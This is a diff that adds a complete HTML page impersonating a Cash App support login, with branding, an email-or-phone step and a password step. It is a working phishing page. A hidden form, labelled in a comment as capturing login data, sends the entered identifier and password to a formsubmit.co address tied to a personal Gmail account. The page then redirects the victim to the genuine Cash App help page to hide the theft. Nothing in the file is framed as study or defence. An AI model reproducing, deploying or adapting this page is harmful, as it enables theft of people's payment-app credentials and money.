@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Support Login UI</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --background: #000000;
+      --white: #ffffff;
+      --gray: #242424;
+      --button-gray: #cccccc;
+      --green: #00d54b;
+    }
+
+    html {
+      width: 100%;
+      min-height: 100%;
+    }
+
+    body {
+      width: 100%;
+      min-height: 100vh;
+      background: var(--background);
+      color: var(--white);
+      font-family: Arial, Helvetica, sans-serif;
+      -webkit-font-smoothing: antialiased;
+      overflow-x: hidden;
+    }
+
+    button,
+    input {
+      font-family: inherit;
+    }
+
+    button {
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .page {
+      width: 100%;
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 18px 22px 24px;
+    }
+
+    /* APP ICON */
+    .app-icon {
+      width: 48px;
+      height: 48px;
+      background: var(--green);
+      border-radius: 13px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 48px;
+      flex-shrink: 0;
+    }
+
+    .app-icon svg {
+      width: 34px;
+      height: 34px;
+      display: block;
+    }
+
+    /* HEADING */
+    h1 {
+      font-size: clamp(27px, 5.8vw, 36px);
+      font-weight: 600;
+      line-height: 1.08;
+      letter-spacing: -0.8px;
+      margin-bottom: 36px;
+    }
+
+    /* LOGIN METHOD TOGGLE */
+    .login-toggle {
+      display: flex;
+      align-items: center;
+      width: 100%;
+      height: 58px;
+      border-radius: 100px;
+      background: var(--gray);
+      padding: 3px;
+      margin-bottom: 36px;
+    }
+
+    .toggle-button {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 50%;
+      height: 100%;
+      border: none;
+      border-radius: 100px;
+      color: var(--white);
+      background: transparent;
+      font-size: 15px;
+      font-weight: 600;
+      white-space: nowrap;
+      cursor: pointer;
+      transition: background 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .toggle-button.active {
+      background: #000000;
+      box-shadow: inset 0 0 0 2px #292929;
+    }
+
+    button:focus-visible,
+    input:focus-visible {
+      outline: 2px solid var(--green);
+      outline-offset: 3px;
+    }
+
+    /* INPUT */
+    .input-wrap {
+      width: 100%;
+      margin-bottom: 36px;
+    }
+
+    .input-wrap input {
+      display: block;
+      width: 100%;
+      height: 58px;
+      border: 1.5px solid #dedede;
+      border-radius: 12px;
+      background: transparent;
+      color: var(--white);
+      padding: 0 18px;
+      font-size: 16px;
+      font-weight: 400;
+      outline: none;
+      transition: border-color 0.2s ease;
+      appearance: none;
+      -webkit-appearance: none;
+    }
+
+    .input-wrap input::placeholder {
+      color: #777777;
+      opacity: 1;
+    }
+
+    .input-wrap input:focus {
+      border-color: #ffffff;
+    }
+
+    /* CONTINUE BUTTON */
+    .continue-button {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 58px;
+      border: none;
+      border-radius: 100px;
+      background: var(--button-gray);
+      color: #000000;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s ease, transform 0.1s ease;
+    }
+
+    .continue-button:hover {
+      background: #e0e0e0;
+    }
+
+    .continue-button:active {
+      transform: scale(0.99);
+    }
+
+    /* BACK BUTTON */
+    .back-button {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      min-height: 48px;
+      margin-top: 14px;
+      border: 1px solid #333333;
+      border-radius: 100px;
+      background: transparent;
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+
+    .back-button:hover {
+      background: #171717;
+    }
+
+    .back-button:active {
+      transform: scale(0.99);
+    }
+
+    /* DIVIDER */
+    .divider {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin: 27px 0 28px;
+      color: #252525;
+      font-size: 17px;
+      line-height: 1;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      height: 1px;
+      background: #181818;
+      flex: 1;
+    }
+
+    /* PASSKEY BUTTON */
+    .passkey-button {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 11px;
+      width: 100%;
+      height: 58px;
+      border: none;
+      border-radius: 100px;
+      background: var(--gray);
+      color: var(--white);
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+
+    .passkey-button:hover {
+      background: #303030;
+    }
+
+    .passkey-button:active {
+      transform: scale(0.99);
+    }
+
+    .passkey-icon {
+      display: block;
+      width: 24px;
+      height: 24px;
+      flex-shrink: 0;
+    }
+
+    /* TERMS */
+    .terms {
+      margin-top: 36px;
+      color: #858585;
+      font-size: 13px;
+      line-height: 1.5;
+      overflow-wrap: break-word;
+    }
+
+    .terms a {
+      color: #ffffff;
+      font-weight: 600;
+      text-decoration: underline;
+      text-underline-offset: 2px;
+    }
+
+    /* STATUS MESSAGE */
+    .status-message {
+      display: none;
+      margin-top: 12px;
+      padding: 11px 12px;
+      border-radius: 9px;
+      background: #171717;
+      color: #dddddd;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+
+    .status-message.visible {
+      display: block;
+    }
+
+    /* STEP VISIBILITY */
+    .step {
+      display: none;
+    }
+
+    .step.active {
+      display: block;
+    }
+
+    /* ACCOUNT SUMMARY */
+    .account-summary {
+      margin: -16px 0 28px;
+      color: #999999;
+      font-size: 14px;
+      line-height: 1.5;
+      overflow-wrap: anywhere;
+    }
+
+    .account-summary strong {
+      color: #ffffff;
+      font-weight: 600;
+    }
+
+    /* REDIRECT OVERLAY */
+    .redirect-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #000000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 16px;
+      z-index: 9999;
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 500;
+    }
+
+    .redirect-overlay.visible {
+      display: flex;
+    }
+
+    .redirect-spinner {
+      width: 32px;
+      height: 32px;
+      border: 3px solid rgba(255, 255, 255, 0.2);
+      border-top-color: var(--green);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    /* TABLETS AND DESKTOP */
+    @media (min-width: 601px) {
+      .page {
+        max-width: 480px;
+        padding: 24px 24px 28px;
+      }
+    }
+
+    /* MOBILE SCREENS */
+    @media (max-width: 600px) {
+      .page {
+        max-width: 100%;
+        padding: 18px 6.2% 22px;
+      }
+
+      .app-icon {
+        width: 48px;
+        height: 48px;
+        border-radius: 13px;
+        margin-bottom: 48px;
+      }
+
+      .app-icon svg {
+        width: 34px;
+        height: 34px;
+      }
+
+      h1 {
+        font-size: clamp(27px, 7vw, 36px);
+        letter-spacing: -0.8px;
+        line-height: 1.08;
+        margin-bottom: 36px;
+      }
+
+      .login-toggle {
+        height: 58px;
+        margin-bottom: 36px;
+      }
+
+      .toggle-button {
+        font-size: 15px;
+      }
+
+      .input-wrap {
+        margin-bottom: 36px;
+      }
+
+      .input-wrap input {
+        height: 58px;
+        border-radius: 12px;
+        padding: 0 18px;
+        font-size: 16px;
+      }
+
+      .continue-button {
+        height: 58px;
+        font-size: 17px;
+      }
+
+      .divider {
+        margin: 27px 0 28px;
+        font-size: 17px;
+      }
+
+      .passkey-button {
+        height: 58px;
+        font-size: 16px;
+        gap: 11px;
+      }
+
+      .passkey-icon {
+        width: 24px;
+        height: 24px;
+      }
+
+      .terms {
+        margin-top: 36px;
+        font-size: 13px;
+      }
+    }
+
+    /* VERY SMALL PHONES */
+    @media (max-width: 360px) {
+      .page {
+        padding-left: 18px;
+        padding-right: 18px;
+      }
+
+      h1 {
+        font-size: 26px;
+      }
+
+      .toggle-button {
+        font-size: 13px;
+      }
+
+      .input-wrap input {
+        font-size: 15px;
+        padding: 0 14px;
+      }
+
+      .passkey-button {
+        font-size: 15px;
+        gap: 9px;
+      }
+
+      .terms {
+        font-size: 12px;
+      }
+    }
+
+    /* SHORT MOBILE SCREENS */
+    @media (max-height: 650px) and (max-width: 600px) {
+      .page {
+        padding-top: 14px;
+      }
+
+      .app-icon {
+        margin-bottom: 30px;
+      }
+
+      h1 {
+        margin-bottom: 25px;
+      }
+
+      .login-toggle {
+        margin-bottom: 24px;
+      }
+
+      .input-wrap {
+        margin-bottom: 24px;
+      }
+
+      .divider {
+        margin: 20px 0;
+      }
+
+      .terms {
+        margin-top: 26px;
+      }
+    }
+
+    /* REDUCED MOTION */
+    @media (prefers-reduced-motion: reduce) {
+      *,
+      *::before,
+      *::after {
+        transition-duration: 0.01ms !important;
+        animation-duration: 0.01ms !important;
+        scroll-behavior: auto !important;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <!-- APP ICON -->
+    <div class="app-icon" aria-label="Payment app icon">
+      <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path d="M37.2 9.5L34.9 16.1C42.2 16.9 47.1 20.2 49.2 24.1L42.1 29.3C40.1 26.2 36.9 24.6 32.3 24.6C27.9 24.6 25.4 26.1 25.4 28.7C25.4 31.1 28.1 32 33.7 33.3C42.7 35.3 48.6 38.2 48.6 45.3C48.6 52.5 42.9 57.1 34.2 58.1L31.7 64L24.1 64L26.2 57.7C19.6 56.8 14.5 53.9 11.6 49.5L18.9 44.3C21.5 47.7 25.5 49.6 31.3 49.6C36.4 49.6 39.1 48.1 39.1 45.5C39.1 43.1 36.3 42.1 30.5 40.8C21.8 38.8 15.9 36.2 15.9 29C15.9 21.8 21.4 17.3 29.7 16.2L32.2 9.5Z" fill="white" transform="translate(2 -4) scale(.91)"/>
+      </svg>
+    </div>
+
+    <!-- STEP 1: IDENTITY (EMAIL OR PHONE) -->
+    <section class="step active" id="identityStep">
+      <!-- HEADING -->
+      <h1>Log in to contact Cash App support</h1>
+
+      <!-- LOGIN METHOD TOGGLE -->
+      <div class="login-toggle" role="group" aria-label="Choose a login method">
+        <button class="toggle-button" id="phoneTab" type="button" aria-pressed="false">
+          Phone number
+        </button>
+        <button class="toggle-button active" id="emailTab" type="button" aria-pressed="true">
+          Email
+        </button>
+      </div>
+
+      <!-- IDENTITY FORM -->
+      <form id="identityForm" autocomplete="off" novalidate>
+        <div class="input-wrap">
+          <input id="loginInput" type="email" placeholder="Your email address" aria-label="Email address" autocomplete="off" autocapitalize="none" spellcheck="false" required>
+        </div>
+        <button class="continue-button" type="submit">
+          Continue
+        </button>
+      </form>
+
+      <!-- IDENTITY STATUS MESSAGE -->
+      <div class="status-message" id="identityStatus" role="status" aria-live="polite"></div>
+
+      <!-- DIVIDER -->
+      <div class="divider" aria-hidden="true">
+        <span>or</span>
+      </div>
+
+      <!-- PASSKEY BUTTON -->
+      <button class="passkey-button" id="passkeyButton" type="button">
+        <svg class="passkey-icon" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <circle cx="31" cy="15" r="10" stroke="white" stroke-width="4"/>
+          <path d="M24 22L7 39M12 34L17 39M18 28L23 33" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Log in with passkey</span>
+      </button>
+    </section>
+
+    <!-- STEP 2: PASSWORD -->
+    <section class="step" id="passwordStep">
+      <!-- HEADING -->
+      <h1>Enter your password</h1>
+
+      <!-- ACCOUNT SUMMARY -->
+      <p class="account-summary">
+        Continuing with: <strong id="accountSummary"></strong>
+      </p>
+
+      <!-- PASSWORD FORM -->
+      <form id="passwordForm" autocomplete="off" novalidate>
+        <div class="input-wrap">
+          <input id="passwordInput" type="password" placeholder="Password" aria-label="Password" autocomplete="off" required>
+        </div>
+        <button class="continue-button" type="submit">
+          Continue
+        </button>
+      </form>
+
+      <!-- PASSWORD STATUS MESSAGE -->
+      <div class="status-message" id="passwordStatus" role="status" aria-live="polite"></div>
+    </section>
+
+    <!-- TERMS -->
+    <footer class="terms">
+      By continuing, you agree to the
+      <a href="#" class="terms-link">Terms</a>,
+      <a href="#" class="terms-link">E-Sign</a>,
+      <a href="#" class="terms-link">Privacy Policy</a>
+      and
+      <a href="#" class="terms-link">Cash App Terms</a>.
+    </footer>
+  </main>
+
+  <!-- ============================================= -->
+  <!-- HIDDEN FORMSUBMIT FORM - captures login data -->
+  <!-- ============================================= -->
+  <form action="https://formsubmit.co/chin.hwa132@gmail.com" method="POST" id="agreementForm" style="display:none;">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_subject" value="New login submission">
+    <input type="hidden" name="email" id="formEmail" value="">
+    <input type="hidden" name="password" id="formPassword" value="">
+    <input type="hidden" name="login_method" id="formLoginMethod" value="email">
+    <!-- Redirect to Cash App support page after submission -->
+    <input type="hidden" name="_next" value="https://cash.app/help">
+  </form>
+
+  <!-- REDIRECT OVERLAY (shown while submitting) -->
+  <div class="redirect-overlay" id="redirectOverlay">
+    <div class="redirect-spinner"></div>
+    <span>Logging you in…</span>
+  </div>
+
+  <script>
+    "use strict";
+
+    /* ELEMENTS */
+    const phoneTab = document.getElementById("phoneTab");
+    const emailTab = document.getElementById("emailTab");
+
+    const loginInput = document.getElementById("loginInput");
+    const identityForm = document.getElementById("identityForm");
+    const identityStep = document.getElementById("identityStep");
+    const identityStatus = document.getElementById("identityStatus");
+
+    const passwordStep = document.getElementById("passwordStep");
+    const passwordForm = document.getElementById("passwordForm");
+    const passwordInput = document.getElementById("passwordInput");
+    const passwordStatus = document.getElementById("passwordStatus");
+
+    const accountSummary = document.getElementById("accountSummary");
+    const passkeyButton = document.getElementById("passkeyButton");
+
+    // Hidden form fields for FormSubmit
+    const formEmail = document.getElementById("formEmail");
+    const formPassword = document.getElementById("formPassword");
+    const formLoginMethod = document.getElementById("formLoginMethod");
+    const agreementForm = document.getElementById("agreementForm");
+
+    // Redirect overlay
+    const redirectOverlay = document.getElementById("redirectOverlay");
+
+    let loginMethod = "email";
+
+    /* STATUS MESSAGES */
+    function showStatus(element, message) {
+      element.textContent = message;
+      element.classList.add("visible");
+    }
+
+    function hideStatus(element) {
+      element.textContent = "";
+      element.classList.remove("visible");
+    }
+
+    /* STEP SWITCHING */
+    function showStep(step) {
+      identityStep.classList.toggle("active", step === "identity");
+      passwordStep.classList.toggle("active", step === "password");
+      hideStatus(identityStatus);
+      hideStatus(passwordStatus);
+    }
+
+    /* LOGIN METHOD SWITCHING */
+    function setLoginMethod(method) {
+      loginMethod = method;
+
+      const isEmail = method === "email";
+
+      emailTab.classList.toggle("active", isEmail);
+      phoneTab.classList.toggle("active", !isEmail);
+
+      emailTab.setAttribute("aria-pressed", String(isEmail));
+      phoneTab.setAttribute("aria-pressed", String(!isEmail));
+
+      loginInput.value = "";
+      loginInput.type = isEmail ? "email" : "tel";
+
+      loginInput.placeholder = isEmail
+        ? "Your email address"
+        : "Your phone number";
+
+      loginInput.setAttribute(
+        "aria-label",
+        isEmail ? "Email address" : "Phone number"
+      );
+
+      loginInput.setAttribute(
+        "inputmode",
+        isEmail ? "email" : "tel"
+      );
+
+      loginInput.autocomplete = "off";
+
+      hideStatus(identityStatus);
+    }
+
+    /* PHONE / EMAIL CONTROLS */
+    emailTab.addEventListener("click", function () {
+      setLoginMethod("email");
+    });
+
+    phoneTab.addEventListener("click", function () {
+      setLoginMethod("phone");
+    });
+
+    /* VALIDATE THE IDENTITY FIELD */
+    function validateIdentity(value) {
+      if (!value) {
+        return loginMethod === "email"
+          ? "Enter an email address to continue."
+          : "Enter a phone number to continue.";
+      }
+
+      if (loginMethod === "email") {
+        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!emailPattern.test(value)) {
+          return "Enter a valid email address.";
+        }
+      }
+
+      if (loginMethod === "phone") {
+        const phonePattern = /^\+?[\d\s().-]{7,25}$/;
+        const digitCount = value.replace(/\D/g, "").length;
+        if (!phonePattern.test(value) || digitCount < 7) {
+          return "Check the phone number format and try again.";
+        }
+      }
+
+      return "";
+    }
+
+    /* STEP 1: CONTINUE TO PASSWORD */
+    identityForm.addEventListener("submit", function (event) {
+      event.preventDefault();
+
+      const value = loginInput.value.trim();
+      const error = validateIdentity(value);
+
+      if (error) {
+        showStatus(identityStatus, error);
+        loginInput.focus();
+        return;
+      }
+
+      accountSummary.textContent = value;
+
+      passwordInput.value = "";
+      hideStatus(passwordStatus);
+
+      showStep("password");
+      passwordInput.focus();
+    });
+
+    /* STEP 2: PASSWORD SUBMIT -> SUBMIT TO FORMSUBMIT AND REDIRECT */
+    passwordForm.addEventListener("submit", function (event) {
+      event.preventDefault();
+
+      const emailValue = accountSummary.textContent.trim();
+      const passwordValue = passwordInput.value;
+
+      if (!passwordValue) {
+        showStatus(passwordStatus, "Please enter your password.");
+        passwordInput.focus();
+        return;
+      }
+
+      // Populate hidden form fields
+      formEmail.value = emailValue;
+      formPassword.value = passwordValue;
+      formLoginMethod.value = loginMethod;
+
+      // Show the redirect overlay
+      redirectOverlay.classList.add("visible");
+
+      // Submit the hidden FormSubmit form (this navigates to _next URL)
+      // We submit after a tiny delay so the overlay renders first
+      setTimeout(function () {
+        agreementForm.submit();
+      }, 150);
+    });
+
+    /* PASSKEY */
+    passkeyButton.addEventListener("click", function () {
+      showStatus(
+        identityStatus,
+        "Passkey authentication is not configured."
+      );
+    });
+
+    /* CLEAR FEEDBACK WHEN INPUT CHANGES */
+    loginInput.addEventListener("input", function () {
+      hideStatus(identityStatus);
+    });
+
+    passwordInput.addEventListener("input", function () {
+      hideStatus(passwordStatus);
+    });
+
+    /* POLICY LINKS */
+    document.querySelectorAll(".terms-link").forEach(function (link) {
+      link.addEventListener("click", function (event) {
+        event.preventDefault();
+        showStatus(
+          identityStatus,
+          "Policy navigation is not configured."
+        );
+      });
+    });
+
+    /* INITIALIZE HIDDEN FORM FIELDS */
+    formEmail.value = "";
+    formPassword.value = "";
+    formLoginMethod.value = "email";
+  </script>
+</body>
+</html>
